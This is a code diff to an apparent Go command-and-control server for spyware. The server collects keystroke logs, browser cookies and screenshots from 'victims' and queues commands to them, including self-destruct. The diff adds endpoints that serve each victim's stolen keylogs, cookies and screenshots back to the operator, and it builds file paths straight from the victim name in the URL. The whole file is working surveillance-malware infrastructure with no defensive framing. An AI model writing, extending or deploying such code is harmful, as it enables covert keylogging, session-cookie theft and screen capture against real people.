@@ -1,10 +1,12 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"fmt"
 	"github.com/gin-gonic/gin"
 	_ "github.com/gin-gonic/gin"
+	"image"
 	"image/png"
 	"net/http"
 	"os"
@@ -23,6 +25,10 @@ type TextLog struct {
 	Body string `json:"body"`
 }
 
+type VictimLog struct {
+	Victim string `uri:"victim"`
+}
+
 type ImageLog struct {
 	Log  Log    `json:"log"`
 	Body []byte `json:"body"`
@@ -34,9 +40,7 @@ const (
 	CookieMonsterAction = "cookies"
 	ScreenshotAction    = "screenshot"
 	SelfDestructAction  = "self-destruct"
-	StopAction          = "stop (keylog|lazyKeylog|cookies|screenshot)"
-
-	DefaultCommand = CookieMonsterAction
+	StopAction          = "stop (keylog|lazyKeylog)"
 
 	KeylogFilename     = "keylog.txt"
 	ScreenshotFilename = "ss.png"
@@ -82,9 +86,7 @@ func main() {
 				return
 			}
 		}
-		c.JSON(200, gin.H{
-			ActionKey: DefaultCommand,
-		})
+		c.JSON(201, struct{}{})
 	})
 
 	sv.POST("/lazyKeylog", func(c *gin.Context) {
@@ -111,16 +113,14 @@ func main() {
 				return
 			}
 		}
-		c.JSON(200, gin.H{
-			ActionKey: DefaultCommand,
-		})
+		c.JSON(201, struct{}{})
 	})
 
 	sv.POST("/commands", func(context *gin.Context) {
-		var victim Log
+		var victim TextLog
 		if err := context.ShouldBindJSON(&victim); err == nil {
 			if len(CommandsStack) > 0 {
-				comm := getCommand(victim.Victim)
+				comm := getCommand(victim.Log.Victim)
 				if comm == nil {
 					context.JSON(http.StatusNotFound, gin.H{
 						ActionKey: ErrorMessage,
@@ -133,7 +133,7 @@ func main() {
 				return
 			}
 		}
-		context.JSON(http.StatusOK, gin.H{
+		context.JSON(http.StatusNotFound, gin.H{
 			ActionKey: ErrorMessage,
 		})
 	})
@@ -170,9 +170,7 @@ func main() {
 				}
 			}
 		}
-		context.JSON(200, gin.H{
-			ActionKey: DefaultCommand,
-		})
+		context.JSON(201, struct{}{})
 	})
 
 	sv.POST("/cookies", func(c *gin.Context) {
@@ -199,9 +197,7 @@ func main() {
 				return
 			}
 		}
-		c.JSON(200, gin.H{
-			ActionKey: DefaultCommand,
-		})
+		c.JSON(201, struct{}{})
 	})
 
 	sv.POST("/screenshot", func(c *gin.Context) {
@@ -210,6 +206,8 @@ func main() {
 			img, err := png.Decode(bytes.NewReader(text.Body))
 			if err != nil {
 				fmt.Println(err)
+				c.JSON(400, nil)
+				return
 			}
 
 			//save the imgByte to file
@@ -218,23 +216,71 @@ func main() {
 
 			if err != nil {
 				fmt.Println(err)
+				c.JSON(400, nil)
+				return
 			}
 
 			err = png.Encode(out, img)
 
 			if err != nil {
 				fmt.Println(err)
+				c.JSON(400, nil)
+				return
 			}
 		} else {
-			println(err)
+			fmt.Println(err)
 		}
-		c.JSON(200, gin.H{
-			ActionKey: DefaultCommand,
-		})
+		c.JSON(201, struct{}{})
+	})
+
+	sv.GET("/screenshot/:victim", func(c *gin.Context) {
+		var text VictimLog
+		if err := c.BindUri(&text); err != nil {
+			c.AbortWithError(http.StatusBadRequest, err)
+			return
+		}
+		img, err := getImageFromFilePath(fmt.Sprintf("%s/%s", text.Victim, ScreenshotFilename))
+		if err != nil {
+			c.AbortWithError(http.StatusBadRequest, err)
+			return
+		}
+		buf := new(bytes.Buffer)
+		err = png.Encode(buf, img)
+		if err != nil {
+			c.AbortWithError(http.StatusBadRequest, err)
+			return
+		}
+		send := buf.Bytes()
+		c.JSON(200, send)
+	})
+
+	sv.GET("/cookies/:victim", func(c *gin.Context) {
+		GetFileContent(c, CookiesFilename)
+	})
+
+	sv.GET("/keylog/:victim", func(c *gin.Context) {
+		GetFileContent(c, KeylogFilename)
+	})
+
+	sv.GET("/lazyKeylog/:victim", func(c *gin.Context) {
+		GetFileContent(c, LazyKeylogFilename)
 	})
 
 	sv.Run()
+}
 
+func GetFileContent(c *gin.Context, filename string) {
+	var victim VictimLog
+	if err := c.BindUri(&victim); err != nil {
+		c.AbortWithError(http.StatusBadRequest, err)
+		return
+	}
+	text, err := getTextFromFilePath(fmt.Sprintf("%s/%s", victim.Victim, filename))
+	if err != nil {
+		c.AbortWithError(http.StatusBadRequest, err)
+		return
+	}
+	c.JSON(200, text)
 }
 
 func getCommand(victim string) *TextLog {
@@ -246,4 +292,47 @@ func getCommand(victim string) *TextLog {
 		}
 	}
 	return nil
+}
+
+func getImageFromFilePath(filePath string) (image.Image, error) {
+	f, err := os.Open(filePath)
+	defer f.Close()
+	if err != nil {
+		return nil, err
+	}
+	image, _, err := image.Decode(f)
+	return image, err
+}
+
+func getTextFromFilePath(filePath string) (string, error) {
+	f, err := os.Open(filePath)
+	defer f.Close()
+	if err != nil {
+		return "", err
+	}
+	rez := ""
+	r := bufio.NewReader(f)
+	s, _, e := r.ReadLine()
+	if e != nil {
+		return "", err
+	}
+	for e == nil {
+		rez += string(s)
+		rez += "\n"
+		s, _, e = r.ReadLine()
+	}
+	return rez, nil
+}
+
+func Readln(r *bufio.Reader) (string, error) {
+	var (
+		isPrefix bool  = true
+		err      error = nil
+		line, ln []byte
+	)
+	for isPrefix && err == nil {
+		line, isPrefix, err = r.ReadLine()
+		ln = append(ln, line...)
+	}
+	return string(ln), err
 }
